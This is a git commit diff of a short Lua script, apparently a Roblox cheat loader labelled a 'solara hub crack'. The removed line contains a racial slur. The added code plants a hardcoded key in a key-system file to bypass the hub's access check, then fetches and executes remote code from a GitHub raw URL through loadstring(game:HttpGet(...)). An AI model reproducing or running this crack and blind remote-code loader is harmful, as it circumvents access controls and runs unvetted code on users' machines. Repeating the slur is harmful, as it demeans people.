34dc378dd6e1b3f26df058e61582f687f9a73305
n1x <pnipon74@gmail.com>
2025-04-13 18:30:49 +0300

    main.lua

--- main.lua
+++ main.lua
@@ -1,1 +1,17 @@
-print('deleted cuz im not nigga')
+-- solara hub crack #2 by n1x
+local keyfile = 'keysystem.key'
+local key = 'XS6h4zKB6FJWcqeQgfq5fcBxbC3Swy'
+
+-- print(key)   --[[ F9 ]]--
+-- setclipboard(key)   --[[ copy key ]]--   
+
+local function appendfile(filename)
+    if not isfile(filename) then 
+        writefile(filename,key)
+    end 
+end
+
+appendfile(keyfile)   -- dont remove it
+
+--[[ solara hub ]]--
+loadstring(game:HttpGet('https://raw.githubusercontent.com/samuraa1/ZeroWare/refs/heads/main/test2.lua'))()
